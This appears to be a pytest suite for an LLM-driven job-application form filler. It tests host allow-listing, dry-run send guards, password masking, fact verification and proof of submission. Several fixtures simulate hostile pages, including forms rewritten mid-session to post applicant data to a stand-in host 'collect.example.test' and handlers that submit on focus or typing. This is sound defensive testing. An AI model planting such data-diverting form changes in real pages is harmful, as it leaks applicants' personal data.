    assert all(s.screenshot == "" for s in res.steps)  # no screenshot of a step where a password was typed / is displayed


async def test_password_is_asked_for_the_host_of_the_frame_holding_the_field(page, server, fast, cv_pdf, tmp_path):
    hosts = []

    def pw(host):
        hosts.append(host)
        return TEST_PASSWORD

    def signup(snap):
        return StepPlan(page_kind="account_signup", actions=[
            act(snap, r"e-mail", "fill", "account_email"), act(snap, r"^Mot de passe", "fill", "account_password"),
            act(snap, r"Confirmez", "fill", "account_password"), act(snap, r"Créer mon compte", "click", role="signup")])
    res = await go(page, server, ScriptedPlanner([signup, StepPlan(page_kind="email_verification")]), tmp_path, cv_pdf,
                   start="framed_signup", mode="submit", password=pw)
    assert res.status == "needs_email" and hosts and set(hosts) == {"localhost"}  # not 127.0.0.1, the top-level page
    assert server.posts_to("/signup") and TEST_PASSWORD not in res.model_dump_json()


async def test_password_never_goes_into_a_field_revealed_as_text(page, server, fast, cv_pdf, tmp_path):
    def plan(snap):
        return StepPlan(page_kind="account_login", actions=[act(snap, r"Mot de passe saisi", "fill", "account_password")])
    res = await go(page, server, ScriptedPlanner([plan, StepPlan(page_kind="other")]), tmp_path, cv_pdf, start="login_get?password=x",
                   mode="submit", max_steps=3)
    assert await page.input_value("#shown") == "x" and "incompatibles" in " ".join(s.note for s in res.steps)


# ------------------------------------------------------------------ C. answers are backed by the cited fact
async def test_unrelated_fact_citation_is_dropped_and_asked(page, server, fast, cv_pdf, tmp_path):
    def plan(snap):
        return StepPlan(page_kind="form", actions=[act(snap, r"Années d'expérience", "fill", "company", "20"),
                                                   act(snap, r"Envoyer", "click", role="submit")])
    # the independent verdict says the answer contradicts / is not backed by the fact: dropped, asked
    for verifier in (FakeVerifier(lambda i: "contradiction"), FakeVerifier(lambda i: "hard_fact"), FakeVerifier(lambda i: False),
                     FakeVerifier(error=RuntimeError("llm down")), None):
        res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="experience", facts=extra_facts(), verifier=verifier)
        assert res.status == "needs_input" and await page.input_value("#exp") == "", verifier
        assert "Années d'expérience" in {q.label for q in res.questions} and "non étayée" in res.steps[0].note


async def test_exact_name_fact_is_refused_in_a_field_labelled_ville(page, server, fast, cv_pdf, tmp_path):
    facts = extra_facts(first_name={"label_re": "pr[eé]nom|first.?name|given"})
    def plan(snap):
        return StepPlan(page_kind="form", actions=[act(snap, r"^Ville", "fill", "first_name"), act(snap, r"Envoyer", "click", role="submit")])
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="experience", facts=facts)
    assert await page.input_value("#fn") == "" and "sans rapport" in res.steps[0].note
    assert "Ville" in {q.label for q in res.questions}
    # and accepted where the label fits
    res = await go(page, server, ScriptedPlanner([form_plan("submit")]), tmp_path, cv_pdf, start="form", facts=facts)
    assert res.status == "ready" and await page.input_value("#fn") == "Camille"


async def test_date_derivation_month_year_accepted_full_date_needs_a_verdict(page, server, fast, cv_pdf, tmp_path):
    def plan(snap):
        return StepPlan(page_kind="form", actions=[act(snap, r"Mois de début", "fill", "available_from", "09/2026"),
                                                   act(snap, r"Disponible à partir", "fill", "available_from", "01/09/2026"),
                                                   act(snap, r"Envoyer", "click", role="submit")])
    # no verifier: only what code can back (a strict re-formatting of the one date) goes through
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="experience", facts=extra_facts(), verifier=None)
    assert await page.input_value("#av2") == "09/2026" and await page.input_value("#av") == ""
    assert "Disponible à partir de" in {q.label for q in res.questions}
    # the verifier sees BOTH (every non-exact fill is checked) and refuses the invented day
    v = FakeVerifier(lambda i: "supported" if i.answer == "09/2026" else "contradiction")
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="experience", facts=extra_facts(), verifier=v)
    assert await page.input_value("#av2") == "09/2026" and await page.input_value("#av") == ""
    assert sorted(i.answer for i in v.calls[0]) == ["01/09/2026", "09/2026"] and all(i.kind == "fill" for i in v.calls[0])
    assert {i.question for i in v.calls[0]} == {"Disponible à partir de", "Mois de début"} and v.calls[0][0].fact_value == "septembre 2026"


async def test_select_not_supported_by_the_verifier_becomes_a_question(page, server, fast, cv_pdf, tmp_path):
    def plan(snap):
        return StepPlan(page_kind="form", actions=[act(snap, r"autorisé", "select", "work_auth", "Oui"),
                                                   act(snap, r"Envoyer", "click", role="submit")])
    ok = FakeVerifier(lambda i: i.answer == "Oui" and "séjour" in i.fact_value)
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="experience", facts=extra_facts(), verifier=ok)
    assert await page.input_value("#q") == "o" and len(ok.calls) == 1  # (other required fields still asked)
    item = ok.calls[0][0]
    assert item.kind == "select" and item.options == ["Oui", "Non"] and "autorisé" in item.question and item.fact_label == "Autorisation de travail"
    assert any(f.fact == "work_auth" for f in res.steps[0].filled)
    for verifier in (FakeVerifier(lambda i: False), FakeVerifier(error=RuntimeError("llm down")), None):
        res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="experience", facts=extra_facts(), verifier=verifier)
        assert await page.input_value("#q") == "" and any("autorisé" in q.label for q in res.questions), verifier
        assert "non étayée" in res.steps[0].note


async def test_cv_upload_and_privacy_consent_are_accepted_by_code_without_the_llm(page, server, fast, cv_pdf, tmp_path):
    def plan(snap):
        return StepPlan(page_kind="form", actions=[act(snap, r"Curriculum|CV", "upload_cv", kind="file"),
                                                   act(snap, r"RGPD", "check", "consent_required"),
                                                   act(snap, r"Envoyer", "click", role="submit")])
    for verifier in (None, FakeVerifier(lambda i: False)):
        res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="form", verifier=verifier)
        assert await page.evaluate("document.getElementById('cv').files.length") == 1 and await page.is_checked("input[name=rgpd]")
        assert {f.fact for f in res.steps[0].filled} == {"cv", "consent_required"}  # the fact actually used


async def test_upload_cv_on_a_letter_field_needs_the_verifier(page, server, fast, cv_pdf, tmp_path):
    def plan(snap):
        return StepPlan(page_kind="form", actions=[act(snap, r"^CV", "upload_cv", kind="file"),
                                                   act(snap, r"^Lettre de motivation", "upload_cv", kind="file"), act(snap, r"Suivant", "click", role="next")])
    v = FakeVerifier(lambda i: "lettre" not in i.question.lower())
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="letter", verifier=v, max_steps=2)
    assert await page.evaluate("document.getElementById('cv').files.length") == 1
    assert await page.evaluate("document.getElementById('lt').files.length") == 0 and res.status == "needs_input"
    assert [i.kind for c in v.calls for i in c] == ["upload_cv"]  # only the letter field went to the verifier


async def test_unlabeled_required_checkbox_is_never_ticked(page, server, fast, cv_pdf, tmp_path):
    def plan(snap):
        return StepPlan(page_kind="form", actions=[act(snap, r"^$", "check", "consent_required", kind="checkbox"),
                                                   act(snap, r"Envoyer", "click", role="submit")])
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="unlabeled")
    assert res.status == "needs_input" and not await page.is_checked("#x") and "sans libellé" in res.steps[0].note
    assert res.questions[0].kind == "checkbox"


async def test_preselected_required_select_without_accepted_action_is_a_question(page, server, fast, cv_pdf, tmp_path):
    def plan(snap):
        return StepPlan(page_kind="form", actions=[act(snap, r"^Prénom", "fill", "first_name"), act(snap, r"Envoyer", "click", role="submit")])
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="preselected")
    assert res.status == "needs_input" and [q.label for q in res.questions] == ["Type de contrat"]  # the +33 prefix is the exception


async def test_fill_actions_are_logged_with_the_fact_actually_used(page, server, fast, cv_pdf, tmp_path):
    res = await go(page, server, ScriptedPlanner([form_plan("submit")]), tmp_path, cv_pdf, start="form")
    assert {f.op: f.fact for f in res.steps[0].filled if f.op in ("upload_cv", "select")} == {"upload_cv": "cv", "select": "available_now"}


# ------------------------------------------------------------------ cookie banners
async def test_cookie_banner_is_dismissed_first_and_never_counts_as_submit(page, server, fast, cv_pdf, tmp_path):
    def cookie(snap):
        return StepPlan(page_kind="form", actions=[act(snap, r"^Tout refuser$", "click", role="cookies")])

    def fill(snap):
        return StepPlan(page_kind="form", actions=[act(snap, r"^Prénom", "fill", "first_name"), act(snap, r"^Nom", "fill", "last_name"),
                                                   act(snap, r"E-mail", "fill", "email"), act(snap, r"^Envoyer ma", "click", role="submit")])
    res = await go(page, server, ScriptedPlanner([cookie, fill]), tmp_path, cv_pdf, start="cookies")
    assert res.status == "ready" and res.steps[0].clicked == "Tout refuser" and await page.locator("#banner").count() == 0
    assert not server.posts and await page.input_value("#fn") == "Camille"


async def test_no_click_at_all_after_data_entry_in_dry_run_cookie_exception_removed(page, server, fast, cv_pdf, tmp_path):
    def plan(snap):
        return StepPlan(page_kind="form", actions=[act(snap, r"^Prénom", "fill", "first_name"), act(snap, r"^Tout refuser$", "click", role="cookies")])
    res = await go(page, server, ScriptedPlanner([plan, StepPlan(page_kind="form")]), tmp_path, cv_pdf, start="cookies", max_steps=2)
    assert res.status == "ready" and res.steps[0].clicked == "" and await page.locator("#banner").count() == 1 and not server.sent


async def test_cookies_role_on_a_non_cookie_label_is_never_clicked_in_dry_run(page, server, fast, cv_pdf, tmp_path):
    def plan(snap):
        return StepPlan(page_kind="form", actions=[act(snap, r"^Prénom", "fill", "first_name"), act(snap, r"^Nom", "fill", "last_name"),
                                                   act(snap, r"E-mail", "fill", "email"), act(snap, r"Accepter et envoyer", "click", role="cookies")])
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="cookies")
    assert res.status == "ready" and await page.locator("#banner").count() == 1 and not server.posts
    def plan2(snap):  # and the real submit button labelled as cookies
        return StepPlan(page_kind="form", actions=[act(snap, r"^Envoyer ma", "click", role="cookies")])
    res = await go(page, server, ScriptedPlanner([plan2]), tmp_path, cv_pdf, start="cookies")
    assert not server.posts and res.status in ("ready", "needs_input")


async def test_cookie_click_after_data_is_gated_and_recorded_but_not_a_final_click_in_submit_mode(page, server, fast, cv_pdf, tmp_path):
    hooks, navs, gates = [], [], []

    async def hook():
        hooks.append(1)

    async def nav():
        navs.append(1)

    async def gate():
        gates.append(1)
        return []

    def plan(snap):
        return StepPlan(page_kind="form", actions=[act(snap, r"^Prénom", "fill", "first_name"), act(snap, r"^Tout refuser$", "click", role="cookies")])
    await go(page, server, ScriptedPlanner([plan, StepPlan(page_kind="form")]), tmp_path, cv_pdf, start="cookies", mode="submit",
             on_submit_click=hook, on_nav_click=nav, before_submit=gate, max_steps=2)
    assert hooks == [] and navs == [1] and gates == [1] and await page.locator("#banner").count() == 0


# ================================================================== second review round
def serve(page, name, body):
    """Serve `body` at /<name> of the fixture server (page-level route: it only answers the document itself)."""
    async def setup():
        await page.route(f"**/{name}", lambda r: r.fulfill(content_type="text/html; charset=utf-8", body=body))
    return setup()


def with_action(act_, label):
    return act_


def inferred(a: Action, basis: str = "", fact: str | None = None) -> Action:
    return a.model_copy(update={"inferred": True, "basis": basis, "fact": fact})


# ------------------------------------------------------------------ 1. dry runs cannot send
async def test_dry_run_native_GET_submission_from_an_input_handler_is_blocked(page, server, fast, cv_pdf, tmp_path):
    def fill(snap):
        return StepPlan(page_kind="form", actions=[act(snap, r"^Prénom", "fill", "first_name")])
    res = await go(page, server, ScriptedPlanner([fill, StepPlan(page_kind="form")]), tmp_path, cv_pdf, start="getsubmit")
    assert res.status == "ready" and "soumission automatique" in res.message and not server.sent


TRIGGERS = {
    "focus": '<label for=fn>Prénom *</label><input id=fn name=first_name onfocus="f.submit()">',
    "typing": '<label for=fn>Prénom *</label><input id=fn name=first_name oninput="f.submit()">',
    "radio": '<fieldset><legend>Êtes-vous disponible immédiatement ? *</legend><label><input type=radio name=d value=oui onchange="f.submit()"> Oui</label>'
             '<label><input type=radio name=d value=non> Non</label></fieldset>',
    "checkbox": '<label><input type=checkbox name=rgpd onchange="f.submit()"> J\'accepte le traitement de mes données personnelles (RGPD) *</label>',
    "select": '<label for=sit>Situation *</label><select id=sit name=s onchange="f.submit()"><option value="">Choisir...</option>'
              '<option value=alt>Alternance</option><option value=stage>Stage</option></select>',
    "combobox_click": '<label for=city>Ville souhaitée *</label><input id=city role=combobox aria-controls=lb autocomplete=off onclick="f.submit()">'
                      '<ul id=lb role=listbox><li role=option>Toulouse</li></ul>',
    "combobox_option": '<label for=city>Ville souhaitée *</label><input id=city role=combobox aria-controls=lb autocomplete=off>'
                       '<ul id=lb role=listbox><li role=option onclick="f.submit()">Toulouse</li></ul>',
}
TRIGGER_ACTIONS = {
    "focus": (r"^Prénom", "fill", "first_name", None), "typing": (r"^Prénom", "fill", "first_name", None),
    "radio": (r"disponible", "select", "available_now", "Oui"), "checkbox": (r"RGPD", "check", "consent_required", None),
    "select": (r"Situation", "select", "situation", "Alternance"), "combobox_click": (r"Ville", "select", "city", "Toulouse"),
    "combobox_option": (r"Ville", "select", "city", "Toulouse"),
}


@pytest.mark.parametrize("kind", list(TRIGGERS))
async def test_dry_run_data_entry_of_every_kind_is_covered_by_the_guard(page, server, fast, cv_pdf, tmp_path, kind):
    """`touched` is set BEFORE the focus / typing / choice starts: a handler that submits (GET) on it is aborted."""
    body = f'<!doctype html><html lang="fr"><body><form id=f method=get action="/collect">{TRIGGERS[kind]}</form></body></html>'
    await serve(page, f"trig_{kind}", body)
    label, op, fact, value = TRIGGER_ACTIONS[kind]
    plan = lambda snap: StepPlan(page_kind="form", actions=[act(snap, label, op, fact, value)])  # noqa: E731
    res = await go(page, server, ScriptedPlanner([plan, StepPlan(page_kind="form")]), tmp_path, cv_pdf, start=f"trig_{kind}")
    assert res.status == "ready" and not server.sent and "soumission automatique" in res.message, (kind, res.message, res.steps[-1].note)


async def test_dry_run_never_clicks_a_submit_button_labelled_accepter_after_data_entry(page, server, fast, cv_pdf, tmp_path):
    def plan(snap):
        return StepPlan(page_kind="form", actions=[act(snap, r"^Prénom", "fill", "first_name"), act(snap, r"^Accepter$", "click", role="cookies")])
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="accept_submit")
    assert res.status == "ready" and res.steps[-1].clicked == "" and not server.sent and not res.submit_clicked
    assert await page.input_value("#fn") == "Camille"


@pytest.mark.parametrize("release_on", [True, False])
async def test_dry_run_delayed_native_post_dies_with_the_released_page(page, server, fast, cv_pdf, tmp_path, monkeypatch, release_on):
    """A form.submit() scheduled 1.5 s after typing used to reach the server after the engine had removed its guard. The pages
    now go to about:blank first (control: without that release the POST does arrive)."""
    monkeypatch.setattr(engine, "RELEASE_PAGES", release_on)

    def plan(snap):
        return StepPlan(page_kind="form", actions=[act(snap, r"^Prénom", "fill", "first_name"), act(snap, r"Suivant", "click", role="next")])
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="delayed_post")
    assert res.status == "ready" and res.final_url.endswith("/delayed_post")
    await asyncio.sleep(2.2)
    if release_on:
        assert not server.sent and page.url == "about:blank"
    else:
        assert len(apply_posts(server)) >= 1


async def test_release_sends_every_followed_popup_to_blank_and_the_guard_goes_away(page, server, fast, cv_pdf, tmp_path, release):
    res = await go(page, server, ScriptedPlanner([job_plan, form_plan("submit")]), tmp_path, cv_pdf, start="popup")
    assert res.status == "ready" and res.final_url.endswith("/form") and len(page.context.pages) == 2
    assert [p.url for p in page.context.pages] == ["about:blank", "about:blank"]
    await page.goto(server.url("continuer"))   # no guard left in the context
    await page.set_input_files("#cv", str(cv_pdf))
    await page.click("button")
    await page.wait_for_load_state()
    assert len(apply_posts(server)) == 1


# ------------------------------------------------------------------ 2. submit mode: gate + durable record before every post-data click
async def test_account_page_click_is_gated_and_recorded_before_it_can_post(page, server, fast, cv_pdf, tmp_path):
    seen = []

    def plan(snap):
        return StepPlan(page_kind="account_login", actions=[act(snap, r"e-mail", "fill", "account_email"), act(snap, r"Continuer", "click", role="next")])

    async def gate():
        seen.append(("gate", len(server.sent)))
        return ["envoi interdit"]
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="login_continue", mode="submit", before_submit=gate)
    assert res.status == "blocked" and "envoi interdit" in res.message and seen == [("gate", 0)] and not server.sent

    navs = []

    async def gate_ok():
        seen.append(("gate", len(server.sent)))
        return []

    async def nav():
        navs.append(len(server.sent))
    res = await go(page, server, ScriptedPlanner([plan, StepPlan(page_kind="email_verification")]), tmp_path, cv_pdf,
                   start="login_continue", mode="submit", before_submit=gate_ok, on_nav_click=nav)
    assert res.status == "needs_email" and navs == [0] and seen[-1] == ("gate", 0) and len(server.posts_to("/login_cont")) == 1
    assert not res.submit_clicked  # an account page holds no application data


async def test_nav_labelled_last_button_has_a_durable_record_and_is_flagged_when_the_form_is_gone(page, server, fast, cv_pdf, tmp_path):
    def plan(snap):
        return StepPlan(page_kind="form", actions=[act(snap, r"^CV", "upload_cv", kind="file"), act(snap, r"Continuer", "click", role="next")])
    navs, finals = [], []

    async def nav():
        navs.append(len(apply_posts(server)))

    async def final():
        finals.append(1)
    # the planner never says "confirmation": the engine still knows structurally that the form is gone
    res = await go(page, server, ScriptedPlanner([plan, StepPlan(page_kind="other")]), tmp_path, cv_pdf, start="continuer", mode="submit",
                   on_nav_click=nav, on_submit_click=final)
    assert res.status == "failed" and "Envoi non confirmé" in res.message and res.submit_clicked
    assert navs == [0] and finals == [] and len(apply_posts(server)) == 1
    # a hook that fails means no click at all
    async def boom():
        raise RuntimeError("db down")
    server.posts.clear()
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="continuer", mode="submit", on_nav_click=boom)
    assert res.status == "blocked" and not apply_posts(server) and not res.submit_clicked and "db down" not in res.message


async def test_multi_step_form_nav_click_is_recorded_and_the_flow_continues(page, server, fast, cv_pdf, tmp_path):
    navs, finals = [], []

    async def nav():
        navs.append(1)

    async def final():
        finals.append(1)
    res = await go(page, server, ScriptedPlanner([step1, step2(), CONFIRMED]), tmp_path, cv_pdf, start="step1", mode="submit",
                   on_nav_click=nav, on_submit_click=final)
    assert res.status == "submitted" and navs == [1] and finals == [1]
    assert not res.steps[1].page_kind == "confirmation" and any("step2" in r for r in server.requests)


# ------------------------------------------------------------------ 3. the destination is bound to the approved hosts
async def fake_site(page, requests, **pages):
    """Serve `pages` {url: html} under https and record every non-GET request."""
    async def handler(route, request):
        if request.method != "GET":
            requests.append(f"{request.method} {request.url}")
        body = pages.get(request.url.replace("https://", "").split("?")[0].replace(".", "_").replace("/", "__"))
        await route.fulfill(content_type="text/html; charset=utf-8", body=body or "<p>ok</p>")
    await page.route("https://*.example.test/**", handler)


FORM_BODY = (FIXTURES / "form.html").read_text(encoding="utf-8")


async def test_top_level_page_on_an_unrecognized_host_gets_no_data(page, server, fast, cv_pdf, tmp_path):
    await _fake_host(page, "https")
    res = await go(page, server, ScriptedPlanner([form_plan("submit")]), tmp_path, cv_pdf, url="https://jobs.example.test/form",
                   host_allowed=lambda h: h == "ok.example.test", mode="submit")
    assert res.status == "blocked" and res.untrusted_host == "jobs.example.test" and not res.submit_clicked
    assert res.message == "Le formulaire est hébergé sur un site non reconnu : jobs.example.test"
    assert await page.input_value("#fn") == "" and await page.evaluate("document.getElementById('cv').files.length") == 0


async def test_a_form_in_a_frame_on_another_host_gets_no_data(page, server, fast, cv_pdf, tmp_path):
    reqs: list[str] = []

    async def handler(route, request):
        if request.url.endswith("/embed"):
            return await route.fulfill(content_type="text/html; charset=utf-8", body='<h1>Offre</h1><iframe src="https://ats.example.test/form" style="width:900px;height:900px"></iframe>')
        if request.method != "GET":
            reqs.append(request.url)
        await route.fulfill(content_type="text/html; charset=utf-8", body=FORM_BODY)
    await page.route("https://*.example.test/**", handler)
    res = await go(page, server, ScriptedPlanner([form_plan("submit")]), tmp_path, cv_pdf, url="https://jobs.example.test/embed",
                   host_allowed=lambda h: h == "jobs.example.test")
    assert res.status == "blocked" and res.untrusted_host == "ats.example.test" and "ats.example.test" in res.message
    assert await page.frame_locator("iframe").locator("#fn").input_value() == ""
    res = await go(page, server, ScriptedPlanner([form_plan("submit")]), tmp_path, cv_pdf, url="https://jobs.example.test/embed",
                   host_allowed=lambda h: h.endswith(".example.test"))
    assert res.status == "ready" and await page.frame_locator("iframe").locator("#fn").input_value() == "Camille"


@pytest.mark.parametrize("variant", ["action", "formaction"])
async def test_a_form_that_posts_to_another_host_gets_no_data(page, server, fast, cv_pdf, tmp_path, variant):
    body = FORM_BODY.replace('action="/apply"', 'action="https://collect.example.test/apply"') if variant == "action" else \
        FORM_BODY.replace('<button type="submit">', '<button type="submit" formaction="https://collect.example.test/apply">')
    reqs: list[str] = []

    async def handler(route, request):
        if request.method != "GET":
            reqs.append(request.url)
        await route.fulfill(content_type="text/html; charset=utf-8", body=body)
    await page.route("https://*.example.test/**", handler)
    res = await go(page, server, ScriptedPlanner([form_plan("submit")]), tmp_path, cv_pdf, url="https://jobs.example.test/form",
                   host_allowed=lambda h: h == "jobs.example.test", mode="submit")
    assert res.status == "blocked" and res.untrusted_host == "collect.example.test" and await page.input_value("#fn") == "" and not reqs
    res = await go(page, server, ScriptedPlanner([form_plan("submit")]), tmp_path, cv_pdf, url="https://jobs.example.test/form",
                   host_allowed=lambda h: h.endswith(".example.test"))
    assert res.status == "ready" and await page.input_value("#fn") == "Camille"


async def test_the_action_changed_after_data_entry_is_caught_right_before_the_click(page, server, fast, cv_pdf, tmp_path):
    reqs: list[str] = []

    async def handler(route, request):
        if request.method != "GET":
            reqs.append(request.url)
        await route.fulfill(content_type="text/html; charset=utf-8", body=FORM_BODY)
    await page.route("https://*.example.test/**", handler)

    class Planner:
        n = 0

        async def plan(self, snap, facts, **kw):
            Planner.n += 1
            if Planner.n == 1:
                return StepPlan(page_kind="form", actions=form_actions(snap))
            await page.evaluate("document.querySelector('form').action = 'https://collect.example.test/apply'")
            return StepPlan(page_kind="form", actions=[act(snap, r"Envoyer ma", "click", role="submit")])
    hooks = []

    async def hook():
        hooks.append(1)
    res = await go(page, server, Planner(), tmp_path, cv_pdf, url="https://jobs.example.test/form", mode="submit", on_submit_click=hook,
                   host_allowed=lambda h: h == "jobs.example.test")
    assert res.status == "blocked" and res.untrusted_host == "collect.example.test" and not reqs and hooks == [] and not res.submit_clicked, (
        res.status, res.message, res.steps[0].note, res.steps[0].filled)


async def test_loopback_always_passes_and_following_a_redirect_is_fine_before_data(page, server, fast, cv_pdf, tmp_path):
    res = await go(page, server, ScriptedPlanner([form_plan("submit")]), tmp_path, cv_pdf, start="form", host_allowed=lambda h: False)
    assert res.status == "ready" and await page.input_value("#fn") == "Camille"
    # an ad on an unrecognized host: clicking "Postuler" (no data yet) is fine, the form it leads to is judged on its own host
    await serve(page, "ad_elsewhere", f'<button onclick="location.href=\'{server.url("form")}\'">Postuler</button>')
    res = await go(page, server, ScriptedPlanner([job_plan, form_plan("submit")]), tmp_path, cv_pdf, start="ad_elsewhere",
                   host_allowed=lambda h: False)
    assert res.status == "ready" and res.steps[0].clicked == "Postuler"


# ------------------------------------------------------------------ 4. no screenshot once a password was typed
async def test_no_screenshot_after_a_password_was_typed_even_if_the_page_echoes_it_invisibly(page, server, fast, cv_pdf, tmp_path):
    def login(snap):
        return StepPlan(page_kind="account_login", actions=[
            act(snap, r"e-mail", "fill", "account_email"), act(snap, r"^Mot de passe", "fill", "account_password"),
            act(snap, r"Se connecter", "click", role="login")])
    res = await go(page, server, ScriptedPlanner([login, StepPlan(page_kind="form")]), tmp_path, cv_pdf, start="login_css", mode="submit",
                   max_steps=3)
    assert len(res.steps) >= 2 and "css_next" in res.steps[1].url and all(s.screenshot == "" for s in res.steps)
    notes = " ".join(s.note for s in res.steps)
    assert notes.count("capture désactivée après saisie du mot de passe") == 1
    assert not list((tmp_path / "shots").glob("*.png")) if (tmp_path / "shots").exists() else True
    assert TEST_PASSWORD not in res.model_dump_json()


# ------------------------------------------------------------------ 5. "submitted" needs proof
CONFIRMATION_TEXTS = [
    ("Votre candidature a bien été reçue.", True), ("Votre candidature a été enregistrée", True), ("Candidature transmise", True),
    ("Votre candidature est bien prise en compte", True), ("Nous avons bien reçu votre candidature", True),
    ("Thank you for applying", True), ("Nous avons bien reçu votre dossier", True), ("Thanks for applying to Exemple SA", True), ("Your application has been received", True),
    ("Application was submitted", True), ("Successfully applied", True), ("Candidature envoyée", True),
    ("Merci d\u2019avoir postulé !", True), ("Merci d'avoir postulé", True), ("Merci pour votre candidature", True),
    ("Your application has been submitted. We will contact you.", True), ("Votre candidature est bien enregistrée. Merci !", True),
    ("Merci !", False), ("MERCI", False), ("Merci pour votre intérêt", False), ("Thank you", False), ("Thank you for your interest", False),
    ("Confirmation de candidature", False), ("Confirmation", False), 
    ("Merci de corriger les erreurs. Votre candidature n'a pas été transmise", False),
    ("Merci de corriger les erreurs. Votre candidature n\u2019a pas été transmise", False),
    ("Merci. Veuillez corriger les champs en rouge", False), ("Thank you. Please correct the errors below", False),
    ("Your application could not be submitted", False), ("Your application has not been received", False),
    ("Application received? Error: please try again", False), ("Candidature envoyée : une erreur est survenue", False),
    ("Once your application is submitted, you will receive an email.", False), ("When your application has been received you will be contacted", False),
    ("Une fois votre candidature envoyée, vous recevrez un e-mail", False), ("Votre candidature sera envoyée demain", False),
    ("If your application is submitted, you will be notified", False), ("Your application will be received by HR", False),
    ("As soon as your application is received, we will reply", False), ("Before your application is submitted, check your CV", False),
    ("Lorsque votre candidature est enregistrée, un mail vous sera envoyé", False), ("Après l'envoi votre candidature est transmise", False),
    ("Thank you for applying. Once reviewed, you will hear from us.", True), ("Votre candidature a bien été envoyée. Vous recevrez un e-mail de confirmation.", True),
    ("Your application has been received! We will contact you soon.", True),
    ("Please confirm your application was submitted.", False), ("Veuillez confirmer que votre candidature a bien été envoyée", False),
    ("Merci de vérifier que votre candidature est enregistrée", False), ("Click here to check your application has been received", False),
    ("Votre candidature a bien été envoyée ?", False), ("Has your application been received?", False),
    ('Type "your application has been received" below', False), ("Pour finaliser, votre candidature doit être envoyée", False),
    ("Assurez-vous que votre candidature a été transmise", False), ("Make sure your application was submitted", False),
    ("Votre candidature est incomplète", False), ("Prénom Nom E-mail Envoyer", False), ("Envoi en cours", False),
    ("Un problème est survenu", False), ("", False), ("mercier", False), ("Merci d'avoir postulé. Échec de l'envoi", False),
]


@pytest.mark.parametrize("text,ok", CONFIRMATION_TEXTS)
def test_confirmation_evidence_regex(text, ok):
    assert confirmation_evidence(text) is ok


async def test_one_field_form_with_a_noop_send_button_and_a_confirmation_verdict_is_not_submitted(page, server, fast, cv_pdf, tmp_path):
    def plan(snap):
        return StepPlan(page_kind="form", actions=[act(snap, r"^Prénom", "fill", "first_name"), act(snap, r"Envoyer", "click", role="submit")])
    res = await go(page, server, ScriptedPlanner([plan, CONFIRMED]), tmp_path, cv_pdf, start="one_field", mode="submit")
    assert res.status == "failed" and res.message.startswith("Envoi non confirmé : vérifier sur le site de l'entreprise")
    assert res.submit_clicked and not server.sent


async def test_an_unrelated_url_change_is_not_a_confirmation(page, server, fast, cv_pdf, tmp_path):
    def plan(snap):
        return StepPlan(page_kind="form", actions=[act(snap, r"^Prénom", "fill", "first_name"), act(snap, r"^Nom", "fill", "last_name"),
                                                   act(snap, r"E-mail", "fill", "email"), act(snap, r"Envoyer", "click", role="submit")])
    res = await go(page, server, ScriptedPlanner([plan, CONFIRMED]), tmp_path, cv_pdf, start="url_change", mode="submit")
    assert page.url.endswith("/merci-bientot") and res.status == "failed" and res.submit_clicked and "Envoi non confirmé" in res.message


async def test_a_page_after_the_post_without_a_confirmation_phrase_is_not_submitted(page, server, fast, cv_pdf, tmp_path):
    server.post_pages["/apply"] = "bare_done.html"
    res = await go(page, server, ScriptedPlanner([job_plan, form_plan("submit"), CONFIRMED]), tmp_path, cv_pdf, mode="submit")
    assert len(apply_posts(server)) == 1 and res.status == "failed" and res.submit_clicked and "Envoi non confirmé" in res.message


async def test_a_confirmation_verdict_while_a_field_shows_an_error_is_not_submitted(page, server, fast, cv_pdf, tmp_path):
    def plan(snap):
        return StepPlan(page_kind="form", actions=[act(snap, r"^Prénom", "fill", "first_name"), act(snap, r"^Nom", "fill", "last_name"),
                                                   act(snap, r"E-mail", "fill", "email"), act(snap, r"Envoyer", "click", role="submit")])
    res = await go(page, server, ScriptedPlanner([plan, CONFIRMED]), tmp_path, cv_pdf, start="errform", mode="submit")
    assert res.status == "failed" and res.submit_clicked and "Le site signale une erreur de saisie" in res.message


async def test_confirmation_verdict_without_any_sending_click_stays_unexpected(page, server, fast, cv_pdf, tmp_path):
    res = await go(page, server, ScriptedPlanner([StepPlan(page_kind="confirmation")]), tmp_path, cv_pdf, start="confirmation", mode="submit")
    assert res.status == "failed" and "confirmation inattendue" in res.message and not res.submit_clicked


# ------------------------------------------------------------------ 6. answers: verdicts, hard facts, deductions
def deduce_plan(*extra, click=True):
    def plan(snap):
        acts = [act(snap, r"^Prénom", "fill", "first_name"), *[e(snap) for e in extra]]
        if click:
            acts.append(act(snap, r"Envoyer", "click", role="submit"))
        return StepPlan(page_kind="form", actions=acts)
    return plan


def eng_choice(snap, *, fact=None, basis="niveau B2 en anglais", flag=True):
    a = act(snap, r"Niveau d'anglais", "select", fact, "I can manage")
    return inferred(a, basis, fact) if flag else a


async def test_exact_identity_facts_never_reach_the_verifier(page, server, fast, cv_pdf, tmp_path):
    v = FakeVerifier()
    res = await go(page, server, ScriptedPlanner([form_plan("submit")]), tmp_path, cv_pdf, start="form", verifier=v)
    assert res.status == "ready" and {i.fact_label for c in v.calls for i in c} == {"Situation recherchée", "Disponible immédiatement"}
    assert all(i.kind != "fill" for c in v.calls for i in c)
    cat = {d["key"] for d in v.facts[0]}
    assert {"first_name", "email", "situation"} <= cat and all(set(d) == {"key", "label", "value"} for d in v.facts[0])
    assert not any(FACT_PASSWORD in str(d) for d in v.facts[0])  # the secret is masked in the catalogue


